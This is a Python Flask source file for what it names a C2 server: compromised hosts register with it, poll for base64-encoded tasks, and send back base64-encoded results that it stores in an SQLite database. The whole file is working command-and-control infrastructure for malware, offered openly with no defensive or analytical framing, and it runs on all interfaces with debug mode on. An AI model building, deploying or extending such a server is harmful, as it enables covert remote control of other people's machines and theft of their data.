import uuid
import flask
import sqlite3
import base64
import ssl

is_b64_enabled = True

#app = flask.Flask(__name__)

def connect_db():
    return sqlite3.connect('c2.db', timeout=10)

def create_app():

    flask_app = flask.Flask(__name__)

    @flask_app.route('/register', methods=['POST'])
    def register():
        conn = None
        try:
            
            type = flask.request.form.get('type')
            ip = flask.request.remote_addr
            host_uuid = str(uuid.uuid4()).replace('-','')        

            conn = connect_db()
            c = conn.cursor()
            c.execute("INSERT INTO hosts (uuid, type, ip) VALUES (?,?,?)", (host_uuid, type, ip))
            conn.commit()
            conn.close()

            return host_uuid, 200
        except Exception as ex:
            print(f'What a Terrible Failure in register: {ex}')
            if conn:
                conn.close()
            # despite the failure, we send as uuid the "FailedRegistration" since the re-registration mechanism might fix it later    
            return 'FailedRegistration', 200

    @flask_app.route('/tasks/<host_name>', methods=['GET'])
    def get_task(host_name):
        conn = None
        try:

            conn = connect_db()
            c = conn.cursor()

            c.execute("SELECT uuid FROM hosts WHERE uuid=?", (host_name,))
            host = c.fetchone()    

            if host:
                c.execute("SELECT task FROM tasks WHERE uuid=?", (host_name,))
                task = c.fetchone()    
                print(f"task is: {task}")    
                conn.close()

                if task:
                    task_str = ''.join(map(str, task))                

                    encoded_data = task_str
                    print(f"encoded_data before: {task_str}")

                    if is_b64_enabled:
                        encoded_data = base64.b64encode(task_str.encode("utf-8"))
                        print(f"encoded_data after: {encoded_data}")

                    return encoded_data, 200
                else:
                    return '', 200

            else:
                conn.close()
                if is_b64_enabled:
                    return base64.b64encode("c2-register".encode("utf-8")), 200
                else:
                    return 'c2-register', 200

        except Exception as ex:
            print(f'What a Terrible Failure in tasks: {ex}')
            if conn:
                conn.close()
            # let the agent to keep trying till the db failure is restored
            return '', 200
        

    @flask_app.route('/results/<host_name>', methods=['POST'])
    def post_result(host_name):
        conn = None
        try:

            result = flask.request.form.get('result')

            conn = connect_db()
            c = conn.cursor()

            decoded_data = result

            if is_b64_enabled:
                decoded_data = base64.b64decode(result).decode("utf-8", errors='ignore')
                print("Decoded data:", decoded_data)        

            print(f'result: {decoded_data}')
            #c.execute("INSERT OR REPLACE INTO results (uuid, result) VALUES (?,?)", (host_name, decoded_data))
            c.execute("INSERT INTO results (uuid, result) VALUES (?,?)", (host_name, decoded_data))
            c.execute("DELETE FROM tasks WHERE uuid=?", (host_name,))
            conn.commit()
            conn.close()

            return '', 200

        except Exception as ex:
            print(f'What a Terrible Failure in results: {ex}')
            if conn:
                conn.close()
            return '', 200

    return flask_app


if __name__ == '__main__':
    #pip install pyopenssl        
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain("server.crt", "server.key")
    app = create_app()
    #app.run(ssl_context='adhoc',debug=True)
    server_port = 5000
    #app.run(host = '0.0.0.0', port = server_port, ssl_context='adhoc')
    app.run(host = '0.0.0.0', port = server_port, ssl_context=context, debug=True)